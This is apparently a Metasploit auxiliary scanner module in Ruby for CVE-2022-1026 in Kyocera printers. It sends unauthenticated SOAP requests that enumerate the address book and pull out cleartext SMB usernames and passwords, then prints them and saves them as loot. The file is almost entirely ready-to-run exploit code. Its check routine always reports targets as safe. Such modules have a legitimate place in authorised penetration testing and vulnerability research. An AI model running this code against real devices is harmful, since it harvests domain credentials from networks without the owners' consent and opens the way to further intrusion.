require 'msf/core'
require 'nokogiri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Kyocera Address Book Password Extract',
      'Description'    => 'An unauthenticated data extraction vulnerability in Kyocera printers, which allows for recovery of cleartext address book and domain joined passwords.',
      'Author'         =>
        [
          'Aaron Herndon @ac3lives (Rapid7)', # Original PoC
          'Yaroslav (Github - @sh94ya)' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true },
      'References'     => 
      	[ 
      	   ['CVE', '2022-1026'],
      	   ['URL', 'https://github.com/ac3lives/kyocera-cve-2022-1026'] 
      	], 
      'DisclosureDate' => '2021-11-12'
    ))

    register_options([
      Opt::RPORT(9091),
      OptString.new('TARGETURI', [true, 'Path to address book', '/ws/km-wsdl/setting/address_book']),
      OptInt.new('ENUM_DELAY', [true, 'Seconds to wait before retrieving the address book enumeration', 5])

    ])
  end

  # Check function
  def check
    CheckCode::Safe
  end
  
  #Parse result
  def parse_result(body)
	xml_doc = Nokogiri::XML(body, nil, 'UTF-8')
	xml_doc.remove_namespaces!
	xml_doc = xml_doc.at_xpath('//Envelope/Body')
	loot_data = ""
	xml_doc.xpath('//personal_address').each do |entry|
	  
	 name     = entry.at_xpath('.//name_information/name')&.text
	 smb_host = entry.at_xpath('.//smb_information/server_name')&.text
	 smb_path = entry.at_xpath('.//smb_information/file_path')&.text
	 user     = entry.at_xpath('.//smb_information/login_name')&.text
	 pass     = entry.at_xpath('.//smb_information/login_password')&.text


	 if user && pass
	   print_status("Find SMB creds from #{smb_host} #{name}:")
	   print_good("Login: #{user} Password: #{pass}")
	   loot_data = loot_data + "#######\nName: #{name}\nHost: #{smb_host}  Path: #{smb_path}\n User: #{user}\n  Pass: #{pass}\n#######\n"
	 end
	 
	end
	
	return loot_data
  end
  

  def run_host(_ip)
    soap_data = '<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>'
      
    print_status("Connect to #{rhost}...")
    res = send_request_cgi({
    	'method' => 'POST',
  	'uri'    => normalize_uri(target_uri.path),
  	'ctype'  => 'application/soap+xml',
  	'data'   => soap_data
    })
    
    if res && res.code == 200
    	print_status("Get response from server")
    	xml_doc = Nokogiri::XML(res.body)
    	xml_doc.remove_namespaces!
    	get_number = xml_doc.at_xpath('//Envelope/Body/create_personal_address_enumerationResponse/enumeration')
    	if get_number
		  number = get_number.text.to_i
		  soap_address = '<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>%s</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>' % number
		  
		  print_status("Obtained address book object: #{number}. Waiting for book to populate")
		  sleep(datastore['ENUM_DELAY'])
		  
		  res = send_request_cgi({
			'method' => 'POST',
			'uri'    => normalize_uri(target_uri.path),
			'ctype'  => 'application/soap+xml',
			'data'   => soap_address
		  })
		      
		  if res && res.code == 200
			loot_data = parse_result(res.body)
			# Save loots
			if(loot_data != "")
				store_loot(
				  "printer.addressbook",  
				  "text/plain",           
				  datastore['RHOST'],     
				  loot_data,              
				  "address_book.txt",     
				  "SMB Credentials from Address Book"
				)
				print_status("Save Loots")
			end
		  
		  elsif res
			print_error("Server error: #{res.code}")
		  end
		      
    	else
			print_error("Error pasre xml response")
		end
    
	elsif res
    	print_error("Server error: #{res.code}")
    
	else
    	print_error("Could not connect to server")
    end
  end

end


